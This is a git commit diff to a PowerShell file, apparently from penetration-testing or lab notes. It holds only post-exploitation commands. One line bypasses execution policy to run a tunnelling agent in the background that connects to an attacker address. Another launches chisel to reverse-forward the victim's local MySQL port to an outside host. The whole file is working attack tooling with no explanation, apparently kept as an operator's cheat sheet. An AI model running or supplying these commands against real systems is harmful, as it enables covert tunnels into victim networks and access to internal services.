b2dc18c03ba5cfe9edc57acb363753e870bf1487
0xhanu58 <0xhanu58@proton.me>
2025-02-11 13:26:51 +0530

    Updated powershell_run_in_bg.ps1
    added a new command which works

--- powershell_run_in_bg.ps1
+++ powershell_run_in_bg.ps1
@@ -1,1 +1,2 @@
-powershell.exe -ep bypass -c "Start-Job -ScriptBlock { C:\Users\apache.ERA\AppData\Local\Temp\agent.exe -ignore-cert -connect 192.168.45.174:7890 }"
+powershell.exe -ep bypass -c "Start-Job -ScriptBlock { C:\Users\apache.ERA\AppData\Local\Temp\agent.exe -ignore-cert -connect 192.168.45.174:7890 }" # might not run with external programs
+powershell.exe -ep bypass -c "Start-Process C:\Users\apache.ERA\AppData\Local\Temp\chisel.exe -ArgumentList 'client 192.168.45.152:7890 R:3306:127.0.0.1:3306'"
